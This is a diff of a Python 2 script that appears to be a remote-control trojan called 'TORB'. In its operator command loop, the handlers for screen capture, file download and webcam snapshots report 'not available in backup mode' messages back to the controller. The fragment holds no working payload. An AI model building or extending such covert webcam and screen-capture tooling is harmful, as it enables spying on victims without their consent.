@@ -324,7 +324,7 @@ def main():
 			elif z == "screengrab":
 				print "Capturing Screen"
 				print "Screen Capture Not Available in Backup Mode"
-				comm_backup("Screen Capture Not Available in Backup Mode")
+				comm_backup("TORB Error\n\nScreen Capture Not Available in Backup Mode")
 				#screenGrab()
 				q = z
 			# Produce Sound
@@ -369,7 +369,7 @@ def main():
 			elif "download" in z:
 				b = z[9:]
 				print "Downloader Not Available in Backup Mode"
-				comm_backup("Downloader Not Available in Backup Mode")
+				comm_backup("TORB Error\n\nDownloader Not Available in Backup Mode")
 				#Downloader(b)
 				q = z
 			elif "read" in z:
@@ -398,8 +398,8 @@ def main():
 			# Activate web camera and save screenshot
 			elif z == "webcamview":
 				try:
-					print "Capturing web cam screenshot..."
-					webcam_Capture()
+					print "Web Cam Screenshot Feature Not Available in Backup Mode"
+					comm_backup("TORB Error\n\nWeb Cam Screenshot Feature Not Available in Backup Mode")
 				except:
 					print "Webcam not found"
 					comm_backup("Web Cam Screenshot Error\n\nWeb cam not found on this machine...")
